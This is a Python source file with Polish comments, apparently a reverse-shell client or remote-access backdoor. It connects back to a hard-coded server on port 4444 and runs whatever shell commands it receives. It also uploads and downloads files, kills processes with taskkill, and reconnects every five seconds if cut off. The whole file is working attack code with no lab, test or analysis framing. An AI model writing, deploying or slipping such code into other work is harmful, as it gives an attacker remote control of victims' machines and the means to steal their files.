import socket
import subprocess
import os

SERVER_HOST = '192.168.1.100'  # zmień na adres IP serwera
SERVER_PORT = 4444

def receive_file(conn, filename):
    with open(filename, 'wb') as f:
        while True:
            data = conn.recv(4096)
            if data.endswith(b'FILE_TRANSFER_COMPLETE'):
                f.write(data[:-len(b'FILE_TRANSFER_COMPLETE')])
                break
            f.write(data)

def send_file(conn, filename):
    if os.path.isfile(filename):
        with open(filename, 'rb') as f:
            chunk = f.read(4096)
            while chunk:
                conn.send(chunk)
                chunk = f.read(4096)
        conn.send(b'FILE_TRANSFER_COMPLETE')
    else:
        conn.send(b'FILE_NOT_FOUND')

def kill_process(process_name):
    try:
        subprocess.run(['taskkill', '/F', '/IM', process_name], capture_output=True, shell=True)
        return f"Proces {process_name} zamknięty.\n"
    except Exception as e:
        return f"Błąd zamykania: {e}\n"

def main():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_HOST, SERVER_PORT))
                while True:
                    command = s.recv(4096).decode()
                    if not command:
                        break
                    if command.lower() == 'exit':
                        break
                    elif command.startswith('download '):
                        # Serwer chce pobrać plik -> wysyłamy go
                        filename = command.split(' ', 1)[1]
                        s.recv(4096)  # odbiór 'READY'
                        send_file(s, filename)
                    elif command.startswith('upload '):
                        # Serwer chce wysłać plik -> odbieramy
                        filename = command.split(' ', 1)[1]
                        s.recv(4096)  # odbiór 'READY'
                        receive_file(s, filename)
                    elif command.startswith('kill '):
                        process_name = command.split(' ', 1)[1]
                        result = kill_process(process_name)
                        s.send(result.encode())
                    else:
                        # Wykonanie polecenia shell
                        output = subprocess.run(command, shell=True, capture_output=True, text=True)
                        s.send(output.stdout.encode() + output.stderr.encode())
        except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError, TimeoutError):
            # Ponowna próba połączenia za 5 sekund
            time.sleep(5)
        except Exception as e:
            time.sleep(5)

if __name__ == '__main__':
    import time
    main()
